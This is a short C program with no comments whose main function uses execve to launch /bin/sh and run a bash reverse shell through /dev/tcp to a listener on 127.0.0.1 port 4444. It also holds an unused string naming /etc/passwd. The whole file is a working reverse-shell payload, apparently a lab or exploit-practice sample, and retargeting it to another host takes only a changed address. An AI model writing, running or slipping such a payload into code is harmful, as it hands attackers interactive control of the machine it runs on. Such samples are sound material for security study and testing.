#include <unistd.h>
char *param = "/etc/passwd";
int main(){
    char *const params[] = {"/bin/sh","-c", "bash -c 'bash -i >&/dev/tcp/127.0.0.1/4444 0>&1'", 0};
    execve(params[0], params, 0);
}
